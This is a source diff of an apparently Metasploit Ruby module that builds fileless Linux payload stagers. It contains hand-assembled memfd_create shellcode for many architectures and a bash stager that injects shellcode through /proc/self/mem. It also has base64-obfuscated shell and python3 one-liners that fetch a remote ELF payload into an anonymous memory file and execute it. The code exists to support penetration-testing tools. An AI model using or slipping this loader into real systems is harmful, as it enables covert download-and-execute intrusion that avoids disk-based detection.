@@ -1,0 +1,405 @@
+module Msf::Payload::Adapter::Fetch::Fileless
+  
+  def _generate_first_stage_shellcode(arch)
+    case arch
+    when 'x64'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pause()
+      in_memory_loader_asm = %(
+      start:
+          xor rsi, rsi
+          push rsi
+          push rsp
+          pop rdi
+          mov rax, 0xfffffffffffffec1 
+          neg rax
+          syscall
+          mov rdi,rax
+          mov al, 0x4d
+          syscall
+          push 0x22
+          pop rax
+          syscall
+
+      )
+      payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
+    when 'x86'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pause()
+      in_memory_loader_asm= %(
+        xor ecx, ecx
+        push ecx
+        lea ebx, [esp]
+        inc ecx
+        mov eax, 0xfffffe9c
+        neg eax
+        int 0x80
+        mov ebx, eax
+        mov al, 0x5d
+        int 0x80
+        mov al, 0x1d
+        int 0x80
+      )
+      payload = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
+    when 'aarch64'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pid = getpid()
+      # kill(pid,SIGSTOP)
+      in_memory_loader_asm = [
+          0x000080d2, #0x1000:	mov	x0, #0	0x000080d2
+          0xe00f1ff8, #0x1004:	str	x0, [sp, #-0x10]!	0xe00f1ff8
+          0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
+          0x210001ca, #0x100c:	eor	x1, x1, x1	0x210001ca
+          0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
+          0x010000d4, #0x1014:	svc	#0	0x010000d4
+          0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
+          0x010000d4, #0x101c:	svc	#0	0x010000d4
+          0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
+          0x010000d4, #0x1024:	svc	#0	0x010000d4
+          0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
+          0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
+          0x010000d4, #0x1030:	svc	#0	0x010000d4
+
+      ]
+      payload = in_memory_loader_asm.pack("N*")
+    when 'armle'
+      in_memory_loader_asm = [
+        0xe3b02000, #0x1000:	movs	r2, #0	0xe3b02000
+        0xe52d2004, #0x1004:	str	r2, [sp, #-4]!	0xe52d2004
+        0xe1a0000d, #0x1008:	mov	r0, sp	0xe1a0000d
+        0xe3a01001, #0x100c:	mov	r1, #1	0xe3a01001
+        0xe3a07083, #0x1010:	mov	r7, #0x83	0xe3a07083
+        0xe28770fe, #0x1014:	add	r7, r7, #0xfe	0xe28770fe
+        0xef000000, #0x1018:	svc	#0	0xef000000
+        0xe3a0705d, #0x101c:	mov	r7, #0x5d	0xe3a0705d
+        0xef000000, #0x1020:	svc	#0	0xef000000
+        0xe3a0701d, #0x1024:	mov	r7, #0x1d	0xe3a0701d
+        0xef000000, #0x1028:	svc	#0	0xef000000
+      ]
+      payload = in_memory_loader_asm.pack("V*")
+    when 'armbe'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pause()
+      in_memory_loader_asm = [
+        0x0020b0e3, #0x1000:	movs	r2, #0	0x0020b0e3
+        0x04202de5, #0x1004:	str	r2, [sp, #-4]!	0x04202de5
+        0x0d00a0e1, #0x1008:	mov	r0, sp	0x0d00a0e1
+        0x0110a0e3, #0x100c:	mov	r1, #1	0x0110a0e3
+        0x8370a0e3, #0x1010:	mov	r7, #0x83	0x8370a0e3
+        0xfe7087e2, #0x1014:	add	r7, r7, #0xfe	0xfe7087e2
+        0x000000ef, #0x1018:	svc	#0	0x000000ef
+        0x5d70a0e3, #0x101c:	mov	r7, #0x5d	0x5d70a0e3
+        0x000000ef, #0x1020:	svc	#0	0x000000ef
+        0x1d70a0e3, #0x1024:	mov	r7, #0x1d	0x1d70a0e3
+        0x000000ef, #0x1028:	svc	#0	0x000000ef
+]
+      payload = in_memory_loader_asm.pack("V*")
+    when 'mips64'
+      in_memory_loader_asm = [
+        0x03a02025, #0x1000:	move	$a0, $sp	0x03a02025
+        0x24050001, #0x1004:	addiu	$a1, $zero, 1	0x24050001
+        0x240214c2, #0x1008:	addiu	$v0, $zero, 0x14c2	0x240214c2
+        0x0101010c, #0x100c:	syscall	0x40404	0x0101010c
+        0x03e02025, #0x1010:	move	$a0, $ra	0x03e02025
+        0x240213d3, #0x1014:	addiu	$v0, $zero, 0x13d3	0x240213d3
+        0x0101010c, #0x1018:	syscall	0x40404	0x0101010c
+        0x240213a9, #0x101c:	addiu	$v0, $zero, 0x13a9	0x240213a9
+        0x0101010c, #0x1020:	syscall	0x40404	0x0101010c
+      ]
+      payload = in_memory_loader_asm.pack('N*')
+    when 'mipsbe'
+      in_memory_loader_asm = [
+          0x03a02025, #0x1000:	move	$a0, $sp	0x03a02025
+          0x24050001, #0x1004:	addiu	$a1, $zero, 1	0x24050001
+          0x24021102, #0x1008:	addiu	$v0, $zero, 0x1102	0x24021102
+          0x0101010c, #0x100c:	syscall	0x40404	0x0101010c
+          0x03e02025, #0x1010:	move	$a0, $ra	0x03e02025
+          0x24020ffd, #0x1014:	addiu	$v0, $zero, 0xffd	0x24020ffd
+          0x0101010c, #0x1018:	syscall	0x40404	0x0101010c
+          0x24020fbd, #0x101c:	addiu	$v0, $zero, 0xfbd	0x24020fbd
+          0x0101010c, #0x1020:	syscall	0x40404	0x0101010c
+
+      ]
+      payload = in_memory_loader_asm.pack('N*')
+    when 'mipsle'
+      in_memory_loader_asm = [
+          0x2520a003, #0x1000:	move	$a0, $sp	0x2520a003
+          0x01000524, #0x1004:	addiu	$a1, $zero, 1	0x01000524
+          0x02110224, #0x1008:	addiu	$v0, $zero, 0x1102	0x02110224
+          0x0c010101, #0x100c:	syscall	0x40404	0x0c010101
+          0x2520e003, #0x1010:	move	$a0, $ra	0x2520e003
+          0xfd0f0224, #0x1014:	addiu	$v0, $zero, 0xffd	0xfd0f0224
+          0x0c010101, #0x1018:	syscall	0x40404	0x0c010101
+          0xbd0f0224, #0x101c:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
+          0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
+]
+      payload = in_memory_loader_asm.pack('N*')
+    when 'loongarch64'
+      # LoongArch uses the asm-generic Linux syscall numbers, like AArch64.
+      # Create an empty memfd and stop this process while the parent fills it.
+      # Instruction encodings: LoongArch Reference Manual, Volume 1, section 2.2.
+      # https://loongson.github.io/LoongArch-Documentation/LoongArch-Vol1-EN.html
+      in_memory_loader_asm = [
+        0x03800005, # ori a1,zero,0 (flags and ftruncate length)
+        0x02ffc063, # addi.d sp,sp,-16
+        0x29c00060, # st.d zero,sp,0 (empty memfd name)
+        0x00150064, # or a0,sp,zero
+        0x03845c0b, # ori a7,zero,279 (SYS_memfd_create)
+        0x002b0000, # syscall 0
+        0x0380b80b, # ori a7,zero,46 (SYS_ftruncate)
+        0x002b0000, # syscall 0
+        0x0382b00b, # ori a7,zero,172 (SYS_getpid)
+        0x002b0000, # syscall 0
+        0x03804c05, # ori a1,zero,19 (SIGSTOP)
+        0x0382040b, # ori a7,zero,129 (SYS_kill)
+        0x002b0000  # syscall 0
+      ]
+      payload = in_memory_loader_asm.pack('V*')
+    when 'riscv64le'
+      # fd = memfd_create("")
+      # ftruncate(fd, 0)
+      # pid = getpid()
+      # kill(pid, SIGSTOP)
+      in_memory_loader_asm = [
+        0x00b5c5b3, # xor   a1, a1, a1         # a1 = 0 (flags)
+        0xff010113, # addi  sp, sp, -16        # allocate stack space
+        0x00b13023, # sd    a1, 0(sp)          # store "" on stack
+        0x00010513, # addi  a0, sp, 0          # a0 = &""
+        0x11700893, # addi  a7, x0, 279        # __NR_memfd_create
+        0x00000073, # ecall                    # fd in a0
+        0x02e00893, # addi  a7, x0, 46         # __NR_ftruncate (a1=0)
+        0x00000073, # ecall
+        0x0ac00893, # addi  a7, x0, 172        # __NR_getpid
+        0x00000073, # ecall                    # pid in a0
+        0x01300593, # addi  a1, x0, 19         # SIGSTOP
+        0x08100893, # addi  a7, x0, 129        # __NR_kill
+        0x00000073, # ecall                    # kill(pid, SIGSTOP)
+      ]
+      payload = in_memory_loader_asm.pack('V*')
+    when 'riscv32le'
+      # fd = memfd_create("")
+      # ftruncate(fd, 0)
+      # pid = getpid()
+      # kill(pid, SIGSTOP)
+      in_memory_loader_asm = [
+        0x00b5c5b3, # xor   a1, a1, a1         # a1 = 0 (flags)
+        0xff010113, # addi  sp, sp, -16        # allocate stack space
+        0x00b12023, # sw    a1, 0(sp)          # store "" on stack
+        0x00010513, # addi  a0, sp, 0          # a0 = &""
+        0x11700893, # addi  a7, x0, 279        # __NR_memfd_create
+        0x00000073, # ecall                    # fd in a0
+        0x02e00893, # addi  a7, x0, 46         # __NR_ftruncate (a1=0)
+        0x00000073, # ecall
+        0x0ac00893, # addi  a7, x0, 172        # __NR_getpid
+        0x00000073, # ecall                    # pid in a0
+        0x01300593, # addi  a1, x0, 19         # SIGSTOP
+        0x08100893, # addi  a7, x0, 129        # __NR_kill
+        0x00000073, # ecall                    # kill(pid, SIGSTOP)
+      ]
+      payload = in_memory_loader_asm.pack('V*')
+
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
+    end
+    return payload
+  end
+
+  # Builds a POSIX shell `$(...)` fragment that reads $vdso_addr, formats it
+  # as a hex string zero-padded to at least `width` digits, and emits it
+  # with its byte order reversed (endianness swap for the target's
+  # little-endian jmp instruction encoding).
+  #
+  # A leading zero is inserted if the formatted hex string ends up an odd
+  # number of digits -- possible whenever $vdso_addr needs more digits than
+  # `width` pads to, e.g. a 32-bit address with the 4-digit armle/mipsle
+  # width below. Without it, the trailing `${v%??}` trim never matches on
+  # the final single character and the loop never terminates.
+  #
+  # @param width [Integer] Minimum hex digits to zero-pad $vdso_addr to.
+  # @return [String] The `$(...)` shell command substitution fragment.
+  def _hex_byte_swap_shell(width)
+    %^$(v=$(printf %0#{width}x $vdso_addr); if [ $((${#v} % 2)) -ne 0 ]; then v="0$v"; fi; o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")^
+  end
+
+  # Builds the shell fragment that encodes a jump to the discovered VDSO
+  # address for the supplied architecture.
+  #
+  # @param arch [String] The target architecture.
+  # @return [String] The shell fragment that produces the jump bytes.
+  def _generate_jmp_instruction(arch)
+    #
+    # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
+
+    case arch
+    # x64 shellcode
+    # mov rax, [target address]
+    # jmp rax
+    when 'x64'
+      %^"48b8"#{_hex_byte_swap_shell(16)}"ffe0"^
+
+    # x86 shellcode
+    # mov eax, [target address]
+    # jmp eax
+    when 'x86'
+      %^"b8"#{_hex_byte_swap_shell(8)}"ffe0"^
+
+    # ARM64 shellcode
+    # ldr x0, #8
+    # br x0
+    when 'aarch64'
+      %^"4000005800001fd6"#{_hex_byte_swap_shell(16)}^
+
+    # ARMle shelcode
+    # ldr.w r2, [pc, #4]
+    # bx    r2
+    when 'armle'
+      %^"dff804201047"#{_hex_byte_swap_shell(4)}^
+
+    # ARMbe shelcode
+    # ldr.w r2, [pc, #4]
+    # bx    r2
+    when 'armbe'
+      %^"f8df20044710"$(echo $(printf %04x $vdso_addr))^
+
+    # MIPSEL shellcode
+    # bgezal $zero, 4
+    # xor $t2, $t2,$t2
+    # lw	$t2, 16($ra)
+    # jr $t2
+    when 'mipsle'
+      %^"000011040000000026504a011000ea8f0800400100000000"#{_hex_byte_swap_shell(4)}^
+
+    # MIPSBE shellcode
+    # bgezal $zero, 4
+    # xor $t2, $t2,$t2
+    # lw	$t2, 16($ra)
+    # jr $t2
+    when 'mipsbe'
+      %^"0411000000000000014a50268fea00100140000800000000"$(echo $(printf %04x $vdso_addr))^
+
+    # MIPS64 shellcode
+    # bgezal $zero, 4
+    # xor $t2, $t2,$t2
+    # ld	$t2, 16($ra)
+    # jr $t2
+    when 'mips64'
+      %^"041100000000000001ce7026dfee001001c0000800000000"$(echo $(printf %016x $vdso_addr))^
+
+    # LoongArch64 shellcode. Prefix a nop when the injection address is 4 mod 8
+    # so the embedded address remains eight-byte aligned on every valid
+    # instruction boundary.
+    # pcaddi t0,0; ld.d t0,t0,16; jirl zero,t0,0; nop
+    # .dword [target address]
+    when 'loongarch64'
+      %($(if [ $((addr % 8)) -eq 4 ]; then printf '00004003'; fi)"0c0000188c41c0288001004c00004003"#{_hex_byte_swap_shell(16)})
+
+    # RISC-V 64-bit LE shellcode
+    # auipc t0, 0
+    # ld    t0, 12(t0)
+    # jr    t0
+    # .dword [target address]
+    when 'riscv64le'
+      %^"9702000083b2c20067800200"#{_hex_byte_swap_shell(16)}^
+
+    # RISC-V 32-bit LE shellcode
+    # auipc t0, 0
+    # lw    t0, 12(t0)
+    # jr    t0
+    # .word [target address]
+    when 'riscv32le'
+      %^"9702000083a2c20067800200"#{_hex_byte_swap_shell(8)}^
+
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
+    end
+  end
+
+# Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
+# New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
+def _generate_fileless_shell(get_file_cmd, arch)
+  stage_cmd = %<writebytes () { printf \\\\%03o "$@" ; };>
+  stage_cmd << %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
+  stage_cmd << %(sc='#{_generate_first_stage_shellcode(arch).unpack("H*")[0]}';)
+  stage_cmd << 'read syscall_info < /proc/self/syscall;'
+  stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
+  stage_cmd << %(jmp=#{_generate_jmp_instruction(arch)};)
+  stage_cmd << 'exec 3>/proc/self/mem;'
+  stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
+  stage_cmd << %(printf "$(writebytes `printf $sc | sed 's/.\\{2\\}/0x& /g'`)" >&3;)
+  stage_cmd << 'exec 3>&-;'
+  stage_cmd << 'exec 3>/proc/self/mem;'
+  stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
+  stage_cmd << %(printf "$(writebytes `printf $jmp | sed 's/.\\{2\\}/0x& /g'`)" >&3;)
+
+  cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | ${SHELL} & "
+  cmd << 'cd /proc/$!;'
+  cmd << 'og_process=$!;'
+  cmd << 'sleep 2;' #adding short pause to give process time to load file handle
+  cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
+
+  cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
+  cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
+  # get_file_cmd is wrapped in a subshell so the trailing `>/dev/null` (added
+  # to swallow noise like a `tee`'s terminal echo) can't clobber a redirect
+  # get_file_cmd already embeds itself (e.g. the plain `GET`-based
+  # `... >$f`) -- the inner, more specific redirect still wins.
+  cmd << "then if (#{get_file_cmd}) >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ];"
+  cmd << 'then $f & FOUND=1;break;'
+  cmd << 'fi;'
+  cmd << 'fi;'
+  cmd << 'done;'
+  cmd << 'fi;'
+  cmd << 'sleep 2;' #adding short pause to give process time to load file handle
+  cmd << 'kill -9 $og_process;'
+end
+  
+  # same idea as _generate_fileless function, but force creating anonymous file handle
+  #
+  # get_file_cmd is base64-encoded and decoded again inside the python one-liner, since it
+  # can contain shell metacharacters (e.g. the arch/endian query string) that would otherwise
+  # break out of the single-quoted `python3 -c '...'` argument it's embedded in.
+  def _generate_fileless_python(get_file_cmd)
+    encoded_get_file_cmd = Base64.strict_encode64(get_file_cmd)
+    %Q<python3 -c 'import os,base64;fd=os.memfd_create("",os.MFD_CLOEXEC);get_file_cmd=base64.b64decode("#{encoded_get_file_cmd}").decode();os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";{get_file_cmd};$f&")'>
+  end
+  
+   # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
+  def _generate_fileless_bash_search(get_file_cmd)
+    # get list of all $USER's processes
+    cmd = 'FOUND=0'
+    cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
+    # already found anonymous file where we can write
+    cmd << '; do if [ $FOUND -eq 0 ]'
+
+    # look for every symbolic link with write rwx permissions
+    # if found one, try to download payload into the anonymous file
+    # and execute it
+    cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
+    cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
+    # get_file_cmd is wrapped in a subshell so the trailing `>/dev/null` (added
+    # to swallow noise like a `tee`'s terminal echo) can't clobber a redirect
+    # get_file_cmd already embeds itself (e.g. the plain `GET`-based
+    # `... >$f`) -- the inner, more specific redirect still wins.
+    cmd << "; then if (#{get_file_cmd}) >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ]"
+    cmd << '; then $f '
+    cmd << '& FOUND=1'
+    # `exit`, not `break` -- a bare break would only exit this inner loop, and
+    # when this search script is concatenated with a fallback (as
+    # _execute_nix's shell-search branch does), the fallback would then run
+    # again and re-download/re-exec the payload a second time.
+    cmd << '; exit 0'
+    cmd << '; fi'
+    cmd << '; fi'
+    cmd << '; done'
+    cmd << '; fi'
+    cmd << '; done'
+    cmd << ';'
+
+    cmd
+  end
+
+end
